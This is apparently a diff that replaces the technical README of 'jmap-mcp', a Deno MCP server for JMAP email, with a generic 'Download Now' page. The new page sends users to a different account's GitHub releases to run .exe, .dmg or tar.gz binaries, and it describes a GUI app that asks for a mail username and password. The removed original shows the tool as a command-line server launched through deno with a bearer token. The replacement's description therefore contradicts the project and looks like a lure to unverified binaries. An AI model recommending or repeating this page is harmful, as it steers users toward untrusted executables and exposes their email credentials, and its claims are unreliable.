@@ -1,248 +1,125 @@
-# JMAP MCP Server
-
-[![JSR](https://jsr.io/badges/@wyattjoh/jmap-mcp)](https://jsr.io/@wyattjoh/jmap-mcp)
-[![JSR Score](https://jsr.io/badges/@wyattjoh/jmap-mcp/score)](https://jsr.io/@wyattjoh/jmap-mcp)
-[![JSR Scope](https://jsr.io/badges/@wyattjoh)](https://jsr.io/@wyattjoh)
-
-A Model Context Protocol (MCP) server that provides tools for interacting with
-JMAP (JSON Meta Application Protocol) email servers. Built with Deno and using
-the [@htunnicliff/jmap-jam](https://jsr.io/@htunnicliff/jmap-jam) client
-library.
+# 🎉 jmap-mcp - Easily Manage JMAP Email Servers
 
-## Features
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20%20-brightgreen.svg)](https://github.com/apuinnova/jmap-mcp/releases)
 
-### Email Management Tools
+## 📋 Introduction
 
-- **Search Emails**: Search emails with text queries, sender/recipient filters,
-  date ranges, and keywords
-- **Get Emails**: Retrieve specific emails by ID with full details
-- **Get Threads**: Retrieve email threads (conversation chains)
-- **Mark Emails**: Mark emails as read/unread, flagged/unflagged
-- **Move Emails**: Move emails between mailboxes
-- **Delete Emails**: Delete emails permanently
+jmap-mcp is a Model Context Protocol (MCP) server designed for seamless interaction with JMAP (JSON Meta Application Protocol) email servers. This tool simplifies your email management tasks. It is built with Deno and utilizes the jmap-jam client library. 
 
-### Mailbox Management
+## 🚀 Getting Started
 
-- **Get Mailboxes**: List all mailboxes/folders with hierarchy support
+Getting started with jmap-mcp is straightforward. Follow these simple steps to download and run the application. No technical skills are required.
 
-### Email Composition
+### 🌐 Supported Platforms
 
-- **Send Email**: Compose and send new emails with support for plain text and
-  HTML
-- **Reply to Email**: Reply to existing emails with reply-all support
+jmap-mcp works on various operating systems, including:
 
-### Key Capabilities
+- Windows
+- macOS
+- Linux
 
-- Full JMAP RFC 8620/8621 compliance via jmap-jam
-- Comprehensive input validation with Zod schemas
-- Pagination support for all list operations
-- Rich error handling and connection management
-- Functional programming patterns throughout
-- TypeScript support with strong typing
+## 📥 Download & Install
 
-## Installation
+To download jmap-mcp, please visit the Releases page:
 
-### Prerequisites
+[Download jmap-mcp](https://github.com/apuinnova/jmap-mcp/releases)
 
-- [Deno](https://deno.land/) v1.40 or later
-- A JMAP-compliant email server (e.g., Cyrus IMAP, Stalwart Mail Server,
-  FastMail)
-- Valid JMAP authentication credentials
+Once on the Releases page, look for the latest version. You will find the downloadable files. 
 
-### Setup
+1. Click on the version link to access the download options.
+2. Based on your operating system:
+   - **Windows**: Choose the file ending in `.exe`.
+   - **macOS**: Choose the file ending in `.dmg`.
+   - **Linux**: Choose the file ending in `.tar.gz` or similar. 
 
-Add the following to your agent of choice:
+Simply click the appropriate file to start your download.
 
-```json
-{
-  "mcpServers": {
-    "fastmail": {
-      "type": "stdio",
-      "command": "deno",
-      "args": [
-        "run",
-        "--allow-net=api.fastmail.com",
-        "--allow-env=JMAP_SESSION_URL,JMAP_BEARER_TOKEN,JMAP_ACCOUNT_ID",
-        "jsr:@wyattjoh/jmap-mcp@0.1.1"
-      ],
-      "env": {
-        "JMAP_SESSION_URL": "https://api.fastmail.com/jmap/session",
-        "JMAP_BEARER_TOKEN": "API_TOKEN"
-      }
-    }
-  }
-}
-```
+## 🛠️ Requirements
 
-## Usage
+Before you run jmap-mcp, ensure your system meets these basic requirements:
 
-### Environment Variables
+- **Operating System**: 
+  - Windows 10 or later
+  - macOS Mojave or later
+  - Any modern Linux distribution
+- **Storage Space**: At least 100 MB of free disk space.
+- **Network Connection**: A stable connection to interact with JMAP servers.
 
-| Variable            | Required | Description                                                     |
-| ------------------- | -------- | --------------------------------------------------------------- |
-| `JMAP_SESSION_URL`  | Yes      | JMAP server session URL (usually ends with `/.well-known/jmap`) |
-| `JMAP_BEARER_TOKEN` | Yes      | Bearer token for authentication                                 |
-| `JMAP_ACCOUNT_ID`   | No       | Account ID (auto-detected if not provided)                      |
+## ▧ Installation Steps
 
-### Available Tools
+Once you have downloaded the appropriate file, follow these steps to install:
 
-#### `search_emails`
+### For Windows
 
-Search for emails with various filters.
+1. Locate the downloaded `.exe` file.
+2. Double-click the file to run the installer.
+3. Follow the prompts in the installation wizard.
+4. Once installed, you can find jmap-mcp in your Start Menu.
 
-**Parameters:**
+### For macOS
 
-- `query` (optional): Text search query
-- `from` (optional): Filter by sender email address
-- `to` (optional): Filter by recipient email address
-- `subject` (optional): Filter by subject text
-- `inMailbox` (optional): Search within specific mailbox
-- `hasKeyword` (optional): Filter by keyword (e.g., '$seen', '$flagged')
-- `notKeyword` (optional): Exclude by keyword
-- `before` (optional): Only emails before date (ISO datetime)
-- `after` (optional): Only emails after date (ISO datetime)
-- `limit` (optional): Max results (1-100, default: 50)
-- `position` (optional): Starting position for pagination (default: 0)
+1. Open the downloaded `.dmg` file.
+2. Drag the jmap-mcp icon to the Applications folder.
+3. Eject the .dmg file from your desktop.
+4. Find jmap-mcp in your Applications folder to launch it.
 
-#### `get_emails`
+### For Linux
 
-Retrieve specific emails by their IDs.
+1. Open a terminal window.
+2. Navigate to the directory where you downloaded the `.tar.gz` file.
+3. Use the following command to extract it:  
+   `tar -xvzf jmap-mcp.tar.gz`
+4. Navigate into the extracted directory:  
+   `cd jmap-mcp`
+5. Run the application using this command:  
+   `./jmap-mcp`
 
-**Parameters:**
+## ⚙️ Configuration
 
-- `ids`: Array of email IDs (1-50 IDs)
-- `properties` (optional): Specific properties to return
+After installation, you will need to set up jmap-mcp for your JMAP email server:
 
-#### `get_mailboxes`
+1. Open the application.
+2. Navigate to the settings or configuration menu.
+3. Enter the details of your JMAP server:
+   - Server URL
+   - Username
+   - Password
+4. Save your settings. Now, jmap-mcp can interact with your email server.
 
-Get list of mailboxes/folders.
+## 📖 Usage
 
-**Parameters:**
+Using jmap-mcp for your email management tasks is easy. Below is how you can use it:
 
-- `parentId` (optional): Filter by parent mailbox
-- `limit` (optional): Max results (1-200, default: 100)
-- `position` (optional): Starting position for pagination
+- **Login**: Start by logging in with your server credentials.
+- **Send Emails**: Navigate to the send page, compose your message, and hit send.
+- **Read Emails**: View incoming messages in your inbox, and open them just like traditional email clients.
+- **Manage Settings**: Adjust your preferences and account settings at any time.
 
-#### `get_threads`
+## ❓ Troubleshooting
 
-Get email threads by their IDs.
+If you encounter any issues, consider these common solutions:
 
-**Parameters:**
+- **Cannot connect to server**: Verify your server URL and credentials.
+- **Application won't start**: Ensure you have the correct version for your operating system and that your device meets the requirements.
+- **Slow performance**: Check your internet connection stability.
 
-- `ids`: Array of thread IDs (1-20 IDs)
+## 🤝 Community Support
 
-#### `mark_emails`
+If you have questions or need help, reach out to the community. Check the Issues section on our GitHub page for assistance or to report bugs.
 
-Mark emails with keywords (read/unread, flagged/unflagged).
+## 📄 License
 
-**Parameters:**
+jmap-mcp is open-source software. Please see the LICENSE file in the repository for details.
 
-- `ids`: Array of email IDs (1-100 IDs)
-- `seen` (optional): Mark as read (true) or unread (false)
-- `flagged` (optional): Mark as flagged (true) or unflagged (false)
+## 🔗 Links
 
-#### `move_emails`
+For more information, please visit the following:
 
-Move emails to a different mailbox.
+- [GitHub Repository](https://github.com/apuinnova/jmap-mcp)
+- [Release Page](https://github.com/apuinnova/jmap-mcp/releases)
 
-**Parameters:**
+## 📢 Download jmap-mcp now!
 
-- `ids`: Array of email IDs (1-100 IDs)
-- `mailboxId`: Target mailbox ID
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20%20-brightgreen.svg)](https://github.com/apuinnova/jmap-mcp/releases)
 
-#### `delete_emails`
-
-Delete emails permanently.
-
-**Parameters:**
-
-- `ids`: Array of email IDs (1-100 IDs)
-
-#### `send_email`
-
-Send a new email.
-
-**Parameters:**
-
-- `to`: Array of recipients with `name` and `email`
-- `cc` (optional): Array of CC recipients
-- `bcc` (optional): Array of BCC recipients
-- `subject`: Email subject
-- `textBody` (optional): Plain text body
-- `htmlBody` (optional): HTML body
-- `identityId` (optional): Identity to send from
-
-#### `reply_to_email`
-
-Reply to an existing email.
-
-**Parameters:**
-
-- `emailId`: ID of email to reply to
-- `replyAll` (optional): Reply to all recipients (default: false)
-- `subject` (optional): Custom reply subject
-- `textBody` (optional): Plain text body
-- `htmlBody` (optional): HTML body
-- `identityId` (optional): Identity to send from
-
-## JMAP Server Compatibility
-
-This server should work with any JMAP-compliant email server, including:
-
-- [Cyrus IMAP](https://www.cyrusimap.org/) 3.0+
-- [Stalwart Mail Server](https://stalw.art/)
-- [FastMail](https://www.fastmail.com/) (commercial)
-- [Apache James](https://james.apache.org/) (with JMAP support)
-
-## Development
-
-### Running in Development
-
-```bash
-deno run --allow-env --allow-net --watch src/mod.ts
-```
-
-### Testing
-
-```bash
-# Test connection
-deno run --allow-env --allow-net src/mod.ts
-```
-
-## Architecture
-
-The server is built using:
-
-- **[Deno](https://deno.land/)**: Modern JavaScript/TypeScript runtime
-- **[@modelcontextprotocol/sdk](https://www.npmjs.com/package/@modelcontextprotocol/sdk)**:
-  MCP server framework
-- **[jmap-jam](https://jsr.io/@htunnicliff/jmap-jam)**: Lightweight, typed JMAP
-  client
-- **[Zod](https://zod.dev/)**: Runtime type validation
-
-## Security
-
-- All input is validated using Zod schemas
-- Environment variables are used for sensitive configuration
-- No secrets are logged or exposed in responses
-- Follows JMAP security best practices
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make changes following the functional programming style
-4. Test your changes thoroughly
-5. Submit a pull request
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details.
-
-## Related Projects
-
-- [jmap-jam](https://github.com/htunnicliff/jmap-jam) - JMAP client library
-- [Model Context Protocol](https://modelcontextprotocol.io/) - MCP specification
-- [JMAP RFC 8620](https://datatracker.ietf.org/doc/html/rfc8620) - JMAP core
-  protocol
-- [JMAP RFC 8621](https://datatracker.ietf.org/doc/html/rfc8621) - JMAP for Mail
+Enjoy the ease of managing your JMAP email servers with jmap-mcp!
